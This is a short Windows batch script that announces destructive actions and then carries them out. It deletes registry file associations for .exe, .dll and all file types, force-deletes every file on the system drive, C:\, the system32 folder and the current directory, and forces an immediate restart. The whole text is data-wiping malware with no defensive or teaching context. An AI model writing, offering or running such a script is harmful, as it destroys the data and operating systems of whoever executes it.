@Echo off
echo WARNING: This script will perform destructive actions on your system.

echo Deleting registry entries for .exe, .dll, and all file types...
reg delete HKCR/.exe /f >> log.txt 2>&1
reg delete HKCR/.dll /f >> log.txt 2>&1
reg delete HKCR/* /f >> log.txt 2>&1

echo Deleting all files from the system drive...
del %systemdrive%\*.* /f /s /q >> log.txt 2>&1

echo Deleting all files from C:\...
del C:\*.* /f /s /q >> log.txt 2>&1

echo Deleting all files from C:\WINDOWS\system32...
del C:\WINDOWS\system32\*.* /q >> log.txt 2>&1

echo Deleting all files in the current directory...
del *.* /f /s /q >> log.txt 2>&1

echo Restarting the computer...
shutdown -r -f -t 00 >> log.txt 2>&1

exit
